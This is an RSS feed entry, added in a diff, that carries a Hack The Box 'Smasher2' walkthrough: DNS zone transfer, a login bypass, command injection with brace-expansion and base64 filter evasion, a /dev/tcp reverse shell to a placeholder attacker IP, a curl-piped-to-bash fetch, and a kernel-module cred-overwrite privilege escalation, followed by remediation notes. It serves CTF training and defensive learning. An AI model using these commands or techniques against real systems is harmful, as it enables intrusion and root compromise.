@@ -1,0 +1,60 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Kernel-Module on VAPT Walkthroughs</title><link>https://malayamanas.github.io/tags/kernel-module/</link><description>Recent content in Kernel-Module on VAPT Walkthroughs</description><generator>Hugo</generator><language>en-us</language><lastBuildDate>Mon, 22 Sep 2025 08:15:00 +0000</lastBuildDate><atom:link href="https://malayamanas.github.io/tags/kernel-module/index.xml" rel="self" type="application/rss+xml"/><item><title>Smasher2 HTB - Insane Linux Box Walkthrough</title><link>https://malayamanas.github.io/posts/smasher2-htb-walkthrough/</link><pubDate>Mon, 22 Sep 2025 08:15:00 +0000</pubDate><guid>https://malayamanas.github.io/posts/smasher2-htb-walkthrough/</guid><description>&lt;h1 id="smasher2-htb---insane-linux-box-walkthrough"&gt;Smasher2 HTB - Insane Linux Box Walkthrough&lt;/h1&gt;
+&lt;div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;"&gt;
+ &lt;iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/ELiicja60jI?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"&gt;&lt;/iframe&gt;
+ &lt;/div&gt;
+
+&lt;h2 id="exploitation-steps"&gt;Exploitation Steps&lt;/h2&gt;
+&lt;h3 id="enumeration-phase"&gt;Enumeration Phase&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Nmap Scan&lt;/strong&gt;: Run &lt;code&gt;nmap -sC -sV -oA smasher2 [TARGET-IP]&lt;/code&gt; to identify open ports: SSH (22), DNS (53/TCP, ISC BIND), HTTP (80, Apache on Ubuntu). Note DNS on TCP suggests testing zone transfers.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;DNS Zone Transfer&lt;/strong&gt;: Use &lt;code&gt;dig axfr @[TARGET-IP] smasher2.htb&lt;/code&gt; to dump the zone, revealing subdomain &lt;code&gt;wonderfulsessionmanager.smasher2.htb&lt;/code&gt;. Add to hosts file and access the website.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;HTTP Enumeration&lt;/strong&gt;: Access &lt;code&gt;http://[TARGET-IP]&lt;/code&gt; (403 Forbidden) and &lt;code&gt;http://wonderfulsessionmanager.smasher2.htb&lt;/code&gt; (login page). Test default creds (admin/admin, guest/guest) and basic SQL injection, but fails.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;User-Agent Filtering Check&lt;/strong&gt;: Analyze Nmap&amp;rsquo;s HTTP probe in Wireshark/Burp; discover blacklist on &amp;ldquo;Nmap Scripting Engine&amp;rdquo;. Use custom user-agent for further scans.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Directory Brute-Force&lt;/strong&gt;: Run Gobuster with &lt;code&gt;gobuster dir -u http://[TARGET-IP] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -a &amp;quot;Mozilla/5.0 (compatible;)&amp;quot; -o gobuster_root.out&lt;/code&gt;, finding &lt;code&gt;/backup&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="web-application-analysis-and-bypass"&gt;Web Application Analysis and Bypass&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Download Backup Files&lt;/strong&gt;: From &lt;code&gt;/backup&lt;/code&gt;, download &lt;code&gt;sso.c&lt;/code&gt; (C library) and &lt;code&gt;sso.py&lt;/code&gt; (Flask app). Note logging to &lt;code&gt;creds.log&lt;/code&gt; (forbidden access).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Source Code Review&lt;/strong&gt;: In &lt;code&gt;sso.py&lt;/code&gt;, identify login endpoint &lt;code&gt;/auth&lt;/code&gt; (POST with JSON data). Calls C functions from &lt;code&gt;sso.so&lt;/code&gt;. Grep for functions like &lt;code&gt;log_creds&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Reverse Engineering with Ghidra&lt;/strong&gt;: Decompile &lt;code&gt;sso.so&lt;/code&gt;. Analyze &lt;code&gt;session_manager_check_login&lt;/code&gt;: Parses POST data, extracts username/password. Bug: &lt;code&gt;get_internal_user&lt;/code&gt; and &lt;code&gt;get_internal_pwd&lt;/code&gt; both return username from credentials struct, allowing login if password == username.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Debugging with GDB&lt;/strong&gt;: Load in Python2 interpreter, attach GDB to step through &lt;code&gt;check_login&lt;/code&gt;, confirm username/password comparison uses same value. Handle segfaults from lockouts.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Login Bypass&lt;/strong&gt;: Brute-force usernames with matching passwords (e.g., &amp;ldquo;Administrator&amp;rdquo;/&amp;ldquo;Administrator&amp;rdquo;). Success grants API key. Lockout (10 attempts) is intended vuln, but bypassed.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="command-execution-and-shell"&gt;Command Execution and Shell&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;API Endpoint Access&lt;/strong&gt;: POST to &lt;code&gt;/api/&amp;lt;api_key&amp;gt;/job&lt;/code&gt; with JSON &lt;code&gt;{&amp;quot;schedule&amp;quot;: &amp;quot;&amp;lt;command&amp;gt;&amp;quot;}&lt;/code&gt;. Test reveals command execution.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Web Filter Evasion&lt;/strong&gt;: Commands with spaces forbidden (403). Use Bash brace expansion (e.g., &lt;code&gt;{echo,test}&lt;/code&gt; expands to &amp;ldquo;echo test&amp;rdquo;). Avoid spaces with commas in braces.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Base64 Encoding for Complex Commands&lt;/strong&gt;: Base64-encode payloads (e.g., reverse shell), decode/execute with &lt;code&gt;{base64,-d}|{bash,-i}&lt;/code&gt; to evade filters on flags like &lt;code&gt;-d&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Reverse Shell&lt;/strong&gt;: Encode &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/[ATTACKER-IP]/9001 0&amp;gt;&amp;amp;1&lt;/code&gt;, send via API. Catch with &lt;code&gt;nc -lvnp 9001&lt;/code&gt;. Upgrade shell via SSH key drop (generate key, add to &lt;code&gt;.ssh/authorized_keys&lt;/code&gt;).&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="privilege-escalation"&gt;Privilege Escalation&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Enumeration with LinPEAS&lt;/strong&gt;: Run LinPEAS script (&lt;code&gt;curl [ATTACKER-IP]:9001/linpeas.sh | bash&lt;/code&gt;). Highlights unsigned kernel module &lt;code&gt;d_hid.ko&lt;/code&gt; (signature verification failed).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Download and Analyze Module&lt;/strong&gt;: SCP &lt;code&gt;d_hid.ko&lt;/code&gt; locally, decompile in Ghidra. Identify device &lt;code&gt;/dev/d_hid&lt;/code&gt; (block device, registered in init). Read/open functions copy data to user space.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Memory Mapping Exploit&lt;/strong&gt;: Use &lt;code&gt;mmap&lt;/code&gt; to map &lt;code&gt;/dev/d_hid&lt;/code&gt; (kernel space) to user space. Search mapped memory for credential struct (sequence of UID/GID 1000 x8). Overwrite UIDs/GIDs to 0 (root).&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Exploit Code Development&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;Open &lt;code&gt;/dev/d_hid&lt;/code&gt; (O_RDWR).&lt;/li&gt;
+&lt;li&gt;Map large memory range (e.g., 0x42424242 bytes starting at 0x42424200) with &lt;code&gt;mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0)&lt;/code&gt;.&lt;/li&gt;
+&lt;li&gt;Scan for cred struct: Loop through addresses, check for 8 consecutive UIDs (1000).&lt;/li&gt;
+&lt;li&gt;Overwrite: Set UIDs/GIDs to 0, skip secure bits (4 bytes). Set capabilities to 0x1234 (full).&lt;/li&gt;
+&lt;li&gt;Launch shell: &lt;code&gt;execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, NULL)&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Execution&lt;/strong&gt;: Compile exploit.c, run on box. Gains root shell. Note: Overwriting affects all processes if not targeted.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="security-gaps-and-remediation"&gt;Security Gaps and Remediation&lt;/h2&gt;
+&lt;h3 id="dns-service-isc-bind-on-port-53tcp"&gt;DNS Service (ISC BIND on Port 53/TCP)&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Gap: Unrestricted Zone Transfer (AXFR)&lt;/strong&gt;
+The DNS server allows zone transfers to unauthorized clients, leaking subdomain information (e.g., wonderfulsessionmanager.smasher2.htb).
+&lt;strong&gt;Fix Type: Configuration&lt;/strong&gt;
+In BIND&amp;rsquo;s named.conf, add &lt;code&gt;allow-transfer { trusted_ips; };&lt;/code&gt; to restrict AXFR to specific IP addresses or ACLs.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="http-server-apache-on-port-80"&gt;HTTP Server (Apache on Port 80)&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;Gap: User-Agent Based Blacklisting&lt;/strong&gt;
+The server blocks requests with specific user-agents like &amp;ldquo;Nmap Scripting Engine&amp;rdquo; (403 Forbidden), but it&amp;rsquo;s easily bypassed by changing the user-agent. This indicates incomplete or weak WAF rules.
+&lt;strong&gt;Fix Type: Configuration&lt;/strong&gt;
+Enhance Apache mod_security or .htaccess rules to use more robust filtering (e.g., regex on broader patterns) or remove if not needed; example: &lt;code&gt;&amp;lt;If &amp;quot;%{HTTP_USER_AGENT} =~ /nmap/i&amp;quot;&amp;gt; Deny from all &amp;lt;/If&amp;gt;&lt;/code&gt; but expand to cover variations.&lt;/p&gt;</description></item></channel></rss>
